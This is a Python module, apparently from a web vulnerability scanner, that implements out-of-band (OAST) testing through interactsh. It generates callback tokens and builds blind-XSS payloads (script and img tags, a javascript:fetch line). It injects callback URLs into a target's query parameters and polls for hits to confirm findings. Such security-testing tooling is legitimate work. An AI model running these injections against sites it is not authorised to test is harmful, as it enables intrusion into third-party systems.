from __future__ import annotations
import asyncio
import base64
import contextlib
import hashlib
import hmac
import inspect
import json as _json
import logging
import os
import random
import string
import time
import uuid
import urllib.request
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from importlib import import_module
from importlib.util import find_spec
from typing import Any, Dict, Iterable, List, Optional, Protocol, Sequence, Tuple
from urllib.parse import urlencode, urlparse, parse_qsl, urlunparse, urlsplit, urlunsplit
import requests as _req

# ---------------------------------------------------------------------------
# RSA + AES-GCM yardımcıları (interactsh şifreli polling için)
# ---------------------------------------------------------------------------
try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa, padding as _asym_padding
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.backends import default_backend
    _CRYPTO_OK = True
except ImportError:
    _CRYPTO_OK = False

_logger = logging.getLogger(__name__)


def _generate_rsa_keypair(key_size: int = 2048) -> tuple[bytes, str]:
    """
    RSA anahtar çifti üretir.
    Döner: (private_key_pem_bytes, public_key_der_base64_str)
    """
    if not _CRYPTO_OK:
        raise RuntimeError("cryptography paketi gerekli: pip install cryptography")
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=key_size,
        backend=default_backend(),
    )
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    public_der = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    public_b64 = base64.b64encode(public_der).decode("ascii")
    return private_pem, public_b64


def _rsa_decrypt(private_key_pem: bytes, ciphertext: bytes) -> bytes:
    """RSA-OAEP ile şifrelenmiş veriyi çözer."""
    if not _CRYPTO_OK:
        raise RuntimeError("cryptography paketi gerekli")
    private_key = serialization.load_pem_private_key(
        private_key_pem, password=None, backend=default_backend()
    )
    return private_key.decrypt(
        ciphertext,
        _asym_padding.OAEP(
            mgf=_asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )


def _aes_gcm_decrypt(key: bytes, data: bytes) -> bytes:
    """
    AES-GCM ile şifrelenmiş veriyi çözer.
    interactsh formatı: ilk 12 byte nonce, geri kalan ciphertext+tag
    """
    if not _CRYPTO_OK:
        raise RuntimeError("cryptography paketi gerekli")
    if len(data) < 12:
        raise ValueError("AES-GCM verisi çok kısa")
    nonce, ciphertext = data[:12], data[12:]
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ciphertext, None)

# --- Dynamic Imports for Resilience ---
httpx = import_module('httpx') if find_spec('httpx') is not None else None
if find_spec("websecure.core.utils") is not None:
    _utils_mod = import_module("websecure.core.utils")
    apply_auth_context = getattr(_utils_mod, "apply_auth_context", None)
    _replace_query_param = getattr(_utils_mod, "replace_query_param", None)
    RateLimiter = getattr(_utils_mod, "RateLimiter", None)
    build_dirbust_headers = getattr(_utils_mod, "build_dirbust_headers", None)
else:
    # Fallback / Standalone utils
    def _replace_query_param(url, key, value):
        from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
        p = urlsplit(url)
        q = parse_qsl(p.query, keep_blank_values=True)
        rep = False; out = []
        for k, v in q:
            if not rep and k == key:
                out.append((k, value)); rep = True
            else:
                out.append((k, v))
        if not rep: out.append((key, value))
        return urlunsplit((p.scheme, p.netloc, p.path, urlencode(out), p.fragment))

# =========================== Token & Payload Generation ===========================

def gen_token(prefix: str = "t") -> str:
    return f"{prefix}-{uuid.uuid4().hex[:12]}-{int(time.time())}"

def sign(token: str, secret: str = "") -> Optional[str]:
    if not secret: return None
    return hmac.new(secret.encode(), token.encode(), hashlib.sha256).hexdigest()

def make_token(prefix: str = "ws") -> str:
    return gen_token(prefix)

def token_url(http_base: str, token: str) -> str:
    hb = (http_base or "").rstrip("/")
    return f"{hb}/t/{token}" if hb else f"/t/{token}"

def token_dns(dns_domain: str, token: str) -> str:
    domain = (dns_domain or "").strip(".")
    return f"{token}.{domain}" if domain else token

def build_payloads(
    root_domain: str,
    token: str,
    schemes: Sequence[str] = ("http", "https"),
    include_dns: bool = True,
    include_http: bool = True,
    include_bxss: bool = True,
) -> Dict[str, List[str]]:
    root = (root_domain or "").strip(".")
    host = f"{token}.{root}" if root else token
    payloads: Dict[str, List[str]] = defaultdict(list)

    if include_dns:
        payloads["dns"].append(host)
    if include_http:
        for sc in schemes:
            payloads["http"].append(f"{sc}://{host}/hit?t={token}")
    if include_bxss:
        payloads["bxss"].append(f"<img src=//{host}/bxss?i={token}>")
        payloads["bxss"].append(f"<script src=//{host}/bxss.js?i={token}></script>")
        payloads["bxss"].append(f"javascript:fetch('//{host}/j?i={token}')")
    
    payloads["artifacts"] = [
        token_dns(root_domain, token),
        token_url(f"https://{root}" if root else "", token),
    ]
    return dict(payloads)

# ======================= Query Helpers =======================

def replace_query_param(url: str, key: str, value: Optional[str]) -> str:
    if value is None:
        pr = urlsplit(url)
        q = [(k, v) for (k, v) in parse_qsl(pr.query, keep_blank_values=True) if k != key]
        return urlunsplit((pr.scheme, pr.netloc, pr.path, urlencode(q, doseq=True), pr.fragment))
    
    if callable(_replace_query_param):
        return _replace_query_param(url, key, value)
        
    return _replace_query_param(url, key, value) # Fallback

def inject_query(url: str, key: str, value: Optional[str]) -> str:
    return replace_query_param(url, key, value)

# =========================== Config & Interface ===========================

@dataclass
class OSATConfig:
    enabled: bool = True
    provider: str = "generic"
    root_domain: str = ""
    api_url: str = ""
    api_key: str = ""
    poll_interval: float = 10.0
    timeout: int = 120
    enable_dns: bool = True
    enable_http: bool = True
    enable_bxss: bool = True
    payload_prefix: str = "x"
    dns_domain: str = ""
    token_prefix: str = ""
    interact_base: str = "https://interact.sh"
    interact_register_path: str = "/register"
    interact_poll_path: str = "/poll"
    verify_tls: bool = True
    proxy: Optional[str] = None

    @classmethod
    def from_dict(cls, d: Optional[Dict[str, Any]]) -> "OSATConfig":
        d = d or {}
        cfg = cls(
            enabled=bool(d.get("enabled", True)),
            provider=str(d.get("provider", "generic")),
            root_domain=str(d.get("root_domain", d.get("dns_domain", ""))),
            api_url=str(d.get("api_url", "")),
            api_key=str(d.get("api_key", "")),
            poll_interval=float(d.get("poll_interval", 10.0)),
            timeout=int(d.get("timeout", 120)),
            enable_dns=bool(d.get("enable_dns", True)),
            enable_http=bool(d.get("enable_http", True)),
            enable_bxss=bool(d.get("enable_bxss", True)),
            payload_prefix=str(d.get("payload_prefix", d.get("token_prefix", "x"))),
            dns_domain=str(d.get("dns_domain", d.get("root_domain", ""))),
            token_prefix=str(d.get("token_prefix", d.get("payload_prefix", ""))),
            interact_base=str(d.get("interact_base", "https://interact.sh")),
            interact_register_path=str(d.get("interact_register_path", "/register")),
            interact_poll_path=str(d.get("interact_poll_path", "/poll")),
            verify_tls=bool(d.get("verify_tls", True)),
            proxy=d.get("proxy", None),
        )
        if not cfg.dns_domain and cfg.root_domain: cfg.dns_domain = cfg.root_domain
        if not cfg.token_prefix and cfg.payload_prefix: cfg.token_prefix = cfg.payload_prefix
        if not cfg.payload_prefix and cfg.token_prefix: cfg.payload_prefix = cfg.token_prefix
        return cfg

class IOSATClient(Protocol):
    async def new_token(self) -> str: ...
    def payloads_for(self, token: str) -> Dict[str, List[str]]: ...
    async def poll_async(self, interested_tokens: Iterable[str]) -> List[Dict[str, Any]]: ...
    async def aclose(self) -> None: ...

IOASTClient = IOSATClient

# =========================== Clients ===========================

class _BaseOSAT:
    def __init__(self, cfg: OSATConfig):
        if httpx is None:
            raise RuntimeError("httpx required: pip install httpx[http2]")
        self.cfg = cfg
        ac_params = set(inspect.signature(httpx.AsyncClient).parameters.keys())
        client_kwargs: Dict[str, Any] = {}
        if "verify" in ac_params: client_kwargs["verify"] = cfg.verify_tls
        if "timeout" in ac_params: client_kwargs["timeout"] = httpx.Timeout(cfg.timeout)
        if find_spec("h2") is not None and "http2" in ac_params: client_kwargs["http2"] = True
        if cfg.proxy:
            if "proxy" in ac_params: client_kwargs["proxy"] = cfg.proxy
            elif "proxies" in ac_params: client_kwargs["proxies"] = cfg.proxy
        self._client = httpx.AsyncClient(**client_kwargs)
    
    async def aclose(self) -> None:
        await self._client.aclose()

class GenericOSATClient(_BaseOSAT, IOSATClient):
    async def new_token(self) -> str:
        return gen_token(self.cfg.payload_prefix or "x")
    
    def payloads_for(self, token: str) -> Dict[str, List[str]]:
        return build_payloads(self.cfg.root_domain, token, include_dns=self.cfg.enable_dns, include_http=self.cfg.enable_http, include_bxss=self.cfg.enable_bxss)

    async def poll_async(self, interested_tokens: Iterable[str]) -> List[Dict[str, Any]]:
        found = []
        if not self.cfg.api_url: return found
        tokens = sorted({t for t in (interested_tokens or []) if t})
        if not tokens: return found
        
        headers = {}
        if self.cfg.api_key: headers["Authorization"] = f"Bearer {self.cfg.api_key}"
        
        try:
            r = await self._client.get(self.cfg.api_url, params={"tokens": ",".join(tokens)}, headers=(headers or None))
            if r.status_code == 200:
                data = r.json() or {}
                for ev in (data.get("events") or []):
                    if str(ev.get("token", "")) in tokens: found.append(ev)
        except Exception:
            pass
        return found

class InteractshClient(_BaseOSAT, IOSATClient):
    """
    Gerçek interactsh protokolü ile çalışan OAST istemcisi.

    interactsh sunucusu (interact.sh / oast.fun) RSA-OAEP + AES-GCM
    tabanlı şifreli polling kullanır:

    1. Kayıt: RSA public key + secret → sunucu correlation_id + domain döner
    2. Polling: /poll?id=...&secret=... → {"aes_key": "<b64>", "data": [...]}
       - aes_key, RSA-OAEP ile şifreli AES anahtarıdır
       - data öğeleri AES-GCM ile şifreli JSON eventlerdir (nonce ilk 12 byte)
    """

    def __init__(self, cfg: OSATConfig):
        super().__init__(cfg)
        self._registered = False
        self._correlation_id: Optional[str] = None
        self._secret: Optional[str] = None
        self._private_key_pem: Optional[bytes] = None
        self._public_key_b64: Optional[str] = None
        self._encrypted: bool = True  # Sunucu şifreleme kullanıyor mu

    async def _ensure_registered(self) -> None:
        if self._registered:
            return
        url = self.cfg.interact_base.rstrip("/") + self.cfg.interact_register_path
        secret = uuid.uuid4().hex

        # RSA anahtar çifti oluştur (cryptography mevcut değilse şifresiz fallback)
        if _CRYPTO_OK:
            try:
                self._private_key_pem, self._public_key_b64 = _generate_rsa_keypair()
            except Exception as e:
                _logger.debug(f"[OAST] RSA üretim hatası: {e} — şifresiz mod deneniyor")
                self._encrypted = False
        else:
            self._encrypted = False

        payload: Dict[str, Any] = {"secret-key": secret}
        if self._encrypted and self._public_key_b64:
            payload["public-key"] = self._public_key_b64

        try:
            r = await self._client.post(url, json=payload)
            if r.status_code not in (200, 201):
                # Bazı self-hosted örnekler GET ile kayıt destekler
                r = await self._client.get(url, params={"secret": secret})

            if r.status_code in (200, 201):
                data = r.json() or {}
                self._correlation_id = str(
                    data.get("id") or data.get("correlation_id") or ""
                )
                self._secret = str(data.get("secret-key") or data.get("secret") or secret)
                root = str(data.get("domain") or "").strip(".")
                if root:
                    self.cfg.root_domain = root
                    self.cfg.dns_domain = root
                self._registered = True
                _logger.info(
                    f"[OAST] interactsh kaydı başarılı: "
                    f"id={self._correlation_id[:12] if self._correlation_id else '?'}, "
                    f"domain={self.cfg.root_domain}, encrypted={self._encrypted}"
                )
        except Exception as e:
            _logger.warning(f"[OAST] interactsh kayıt hatası: {e}")
            self._registered = False

    async def new_token(self) -> str:
        await self._ensure_registered()
        return gen_token(self.cfg.payload_prefix or "x")

    def payloads_for(self, token: str) -> Dict[str, List[str]]:
        return build_payloads(
            self.cfg.root_domain, token,
            include_dns=self.cfg.enable_dns,
            include_http=self.cfg.enable_http,
            include_bxss=self.cfg.enable_bxss,
        )

    async def poll_async(self, interested_tokens: Iterable[str]) -> List[Dict[str, Any]]:
        await self._ensure_registered()
        if not self._registered:
            return []

        poll_url = self.cfg.interact_base.rstrip("/") + self.cfg.interact_poll_path
        tokens = set(interested_tokens or [])
        found: List[Dict[str, Any]] = []

        try:
            r = await self._client.get(
                poll_url,
                params={"id": self._correlation_id, "secret": self._secret},
            )
            if r.status_code != 200:
                return found

            data = r.json() or {}

            # --- Şifreli yanıt (gerçek interactsh protokolü) ---
            if self._encrypted and self._private_key_pem and "aes_key" in data:
                evs = self._decrypt_events(data)
            else:
                # Şifresiz fallback (self-hosted veya test ortamı)
                evs = data.get("data") or data.get("events") or data.get("records") or []

            for ev in evs:
                if not isinstance(ev, dict):
                    continue
                tok = str(ev.get("unique-id") or ev.get("unique_id") or ev.get("token") or "")
                if not tok:
                    # Ham istek içinde token ara
                    raw_req = str(ev.get("raw-request") or ev.get("request") or "")
                    for t in tokens:
                        if t and t in raw_req:
                            tok = t
                            break
                if tok in tokens:
                    found.append({
                        "token": tok,
                        "raw": ev,
                        "ts": ev.get("timestamp") or ev.get("time"),
                        "protocol": ev.get("protocol", ""),
                        "remote_address": ev.get("remote-address", ""),
                    })
        except Exception as e:
            _logger.debug(f"[OAST] Polling hatası: {e}")
        return found

    def _decrypt_events(self, data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        interactsh şifreli yanıtını çözer.
        data = {"aes_key": "<b64_rsa_enc_aes_key>", "data": ["<b64_aes_enc_item>", ...]}
        """
        events: List[Dict[str, Any]] = []
        try:
            aes_key_enc = base64.b64decode(data["aes_key"])
            aes_key = _rsa_decrypt(self._private_key_pem, aes_key_enc)

            for item in (data.get("data") or []):
                try:
                    raw_bytes = _aes_gcm_decrypt(aes_key, base64.b64decode(item))
                    ev = _json.loads(raw_bytes.decode("utf-8", errors="replace"))
                    events.append(ev)
                except Exception as e:
                    _logger.debug(f"[OAST] Event çözme hatası: {e}")
        except Exception as e:
            _logger.warning(f"[OAST] AES anahtarı çözme hatası: {e}")
        return events

class CollaboratorClient(_BaseOSAT, IOSATClient):
    # Similar structure to Generic but potentially custom polling logic
    async def new_token(self) -> str:
        return gen_token(self.cfg.payload_prefix or "x")
    def payloads_for(self, token: str) -> Dict[str, List[str]]:
        return build_payloads(self.cfg.root_domain, token, include_dns=self.cfg.enable_dns, include_http=self.cfg.enable_http, include_bxss=self.cfg.enable_bxss)
    async def poll_async(self, interested_tokens: Iterable[str]) -> List[Dict[str, Any]]:
        # Fallback to generic poll
        return []

def create_osat_client(cfg: OSATConfig) -> IOSATClient:
    p = (cfg.provider or "generic").strip().lower()
    if p == "interactsh": return InteractshClient(cfg)
    if p == "collaborator": return CollaboratorClient(cfg)
    return GenericOSATClient(cfg)

# =========================== Sync Wrapper ===========================

class OASTClient:
    def __init__(self, session, cfg_dict: dict | None = None):
        self.cfg = OSATConfig.from_dict(cfg_dict or {})
        self._client: IOSATClient = create_osat_client(self.cfg)
    
    def register(self): return {"ok": True}
    
    def build_url(self, handle=None, tag: str = "") -> str:
        return token_url(f"https://{self.cfg.root_domain}", gen_token(self.cfg.payload_prefix))

    def poll(self, handle) -> dict:
        tokens = handle.get("tokens", []) if isinstance(handle, dict) else list(handle or [])
        return {"events": poll_events_sync(self._client, tokens)}
    
    @property
    def iosat(self) -> IOSATClient: return self._client

def poll_events_sync(client: IOSATClient, tokens: Sequence[str], timeout: Optional[int] = None) -> List[Dict[str, Any]]:
    def _run():
        import asyncio
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        coro = client.poll_async(tokens)
        if timeout: coro = asyncio.wait_for(coro, timeout)
        try:
            return loop.run_until_complete(coro)
        except Exception:
            return []
        finally:
            loop.close()
            
    with ThreadPoolExecutor(max_workers=1) as ex:
        return ex.submit(_run).result()

def run_oast_on_target(
    session,
    *,
    target: dict,
    oast_client: OASTClient,
    discovered: dict | None = None,
    report_cb=None,
    limits: dict | None = None,
    auth_ctx=None
):
    url = (target or {}).get("url") or ""
    cfg = getattr(oast_client, "cfg", OSATConfig())
    client = getattr(oast_client, "iosat", None) or create_osat_client(cfg)
    max_per_loc = int((limits or {}).get("max_injections_per_loc", 3))

    params = []
    if isinstance(discovered, dict):
        params.extend([str(x) for x in (discovered.get("query") or [])])
    if not params:
        params = ["q", "id", "redirect", "return", "next"]
    params = list(dict.fromkeys(params))[:10]

    headers = {} # _headers_from_auth_ctx(auth_ctx)
    cookies = {} # _cookies_from_auth_ctx(auth_ctx)

    tokens = []
    attempted = []
    
    async def _async_inject():
        for k in params:
            tok = await client.new_token()
            tokens.append(tok)
            plds = client.payloads_for(tok)
            vals = (plds.get("http", []) + plds.get("dns", []))[:max_per_loc]
            
            for val in vals:
                inj_url = inject_query(url, k, val)
                try:
                    _req.get(inj_url, headers=(headers or None), cookies=(cookies or None), timeout=6, verify=True)
                    attempted.append({"url": url, "param": k, "injected": val, "oast_token": tok})
                except Exception: pass
    
    # Run async injection sync
    with ThreadPoolExecutor(max_workers=1) as ex:
        def _runner():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(_async_inject())
            loop.close()
        ex.submit(_runner).result()

    # Poll
    found = poll_events_sync(client, tokens, timeout=getattr(cfg, "poll_interval", 10)+5)
    
    # Correlate
    results = []
    found_tokens = {str(ev.get("token")): ev for ev in found}
    for att in attempted:
        tok = att["oast_token"]
        if tok in found_tokens:
            results.append({
                "type": "OAST", "severity": "Yüksek", "url": att["url"], "param": att["param"],
                "injected": att["injected"], "details": found_tokens[tok]
            })
            
    if report_cb:
        for r in results: report_cb(r)

    return results

# Helper exports for injection
def _inject_query_param(url, k, v):
    return replace_query_param(url, k, v)


# ============================================================================
# PERSISTENT OAST POLLING THREAD
# ============================================================================
import threading as _threading

class OASTPollerThread:
    """
    Background thread that polls OAST server during active scans.
    When a callback arrives, it marks the corresponding finding as verified.
    """

    def __init__(self, client, poll_interval: float = 5.0):
        self._client = client
        self._poll_interval = poll_interval
        self._stop_event = _threading.Event()
        self._thread: Optional[_threading.Thread] = None
        self._token_map: Dict[str, dict] = {}  # token -> finding dict ref
        self._lock = _threading.Lock()
        self._callbacks_received: List[dict] = []

    def register_token(self, token: str, finding_ref: dict) -> None:
        """Register an injection token to a finding dict for later correlation."""
        with self._lock:
            self._token_map[token] = finding_ref

    def start(self) -> None:
        if self._thread and self._thread.is_alive():
            return
        self._stop_event.clear()
        self._thread = _threading.Thread(target=self._poll_loop, daemon=True, name="OASTPoller")
        self._thread.start()
        _logger.info("[OAST] Polling thread started")

    def stop(self, timeout: float = 10.0) -> None:
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=timeout)
        _logger.info(f"[OAST] Polling thread stopped. Total callbacks: {len(self._callbacks_received)}")

    def get_verified_count(self) -> int:
        return len(self._callbacks_received)

    def _poll_loop(self) -> None:
        while not self._stop_event.is_set():
            try:
                self._do_poll()
            except Exception as e:
                _logger.debug(f"[OAST] Poll error: {e}")
            self._stop_event.wait(self._poll_interval)

    def _do_poll(self) -> None:
        try:
            tokens = list(self._token_map.keys())
            if not tokens:
                return
            events = poll_events_sync(self._client, tokens, timeout=int(self._poll_interval + 10))
            if events:
                self._process_events(events)
        except Exception as e:
            _logger.debug(f"[OAST] Client poll failed: {e}")

    def _process_events(self, events) -> None:
        with self._lock:
            for event in (events if isinstance(events, list) else [events]):
                ev_str = str(event)
                self._callbacks_received.append(event)
                for token, finding in self._token_map.items():
                    if token in ev_str:
                        finding["verified"] = True
                        finding["oast_callback"] = ev_str[:200]
                        finding["confidence"] = "high"
                        finding["verification_method"] = "oast_dns_http_callback"
                        _logger.info(f"[OAST] Verified finding via callback: token={token[:12]}")


# Global singleton - started/stopped by flow_runner
_GLOBAL_OAST_POLLER: Optional[OASTPollerThread] = None


def start_global_oast_poller(cfg: dict = None) -> Optional[OASTPollerThread]:
    """Start the global OAST polling thread. Call at scan start."""
    global _GLOBAL_OAST_POLLER
    cfg = cfg or {}
    oast_cfg = cfg.get("oast", {})
    poll_interval = float(oast_cfg.get("poll_interval", 5.0))
    try:
        # OSATConfig üzerinden InteractshClient oluştur (constructor imzası sabit)
        osat_cfg = OSATConfig.from_dict({
            "provider": oast_cfg.get("provider", "interactsh"),
            "interact_base": oast_cfg.get("interact_base", "https://interact.sh"),
            "interact_register_path": oast_cfg.get("interact_register_path", "/register"),
            "interact_poll_path": oast_cfg.get("interact_poll_path", "/poll"),
            "root_domain": oast_cfg.get("root_domain", ""),
            "dns_domain": oast_cfg.get("dns_domain", ""),
            "api_key": oast_cfg.get("api_key", ""),
            "enable_dns": oast_cfg.get("enable_dns", True),
            "enable_http": oast_cfg.get("enable_http", True),
            "enable_bxss": oast_cfg.get("enable_bxss", False),
            "payload_prefix": oast_cfg.get("payload_prefix", "ws"),
        })
        client = InteractshClient(osat_cfg)
        _GLOBAL_OAST_POLLER = OASTPollerThread(client, poll_interval=poll_interval)
        _GLOBAL_OAST_POLLER.start()
        _logger.info("[OAST] Global poller başlatıldı.")
        return _GLOBAL_OAST_POLLER
    except Exception as e:
        _logger.warning(f"[OAST] Could not start poller: {e}")
        return None


def stop_global_oast_poller() -> None:
    """Stop the global OAST polling thread. Call at scan end."""
    global _GLOBAL_OAST_POLLER
    if _GLOBAL_OAST_POLLER:
        _GLOBAL_OAST_POLLER.stop()
        _GLOBAL_OAST_POLLER = None


def get_oast_poller() -> Optional[OASTPollerThread]:
    """Get the current global OAST poller."""
    return _GLOBAL_OAST_POLLER
